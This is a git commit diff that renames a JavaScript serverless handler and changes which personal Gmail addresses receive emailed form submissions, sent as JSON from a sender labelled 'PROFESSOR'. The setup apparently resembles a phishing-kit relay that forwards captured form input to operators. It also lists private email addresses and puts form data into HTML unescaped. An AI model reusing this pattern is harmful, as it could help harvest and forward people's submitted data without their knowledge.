3ff4a52f9e8265a7d7253a81bc1d18319f537204
tufailacjsm37-design <tufailacjsm37@gmail.com>
2026-03-11 12:22:04 +0500

    Update and rename ahtsham.js to fahad.js

--- fahad.js
+++ fahad.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <t26660135@gmail.com>`,
-      to: "ahteshamali88888@gmail.com,ta0134750@gmail.com",
-      subject: "ahtsham",
+      to: "fahadali123gg@gmail.com,mhvvvbbvv@gmail.com",
+      subject: "fahad",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
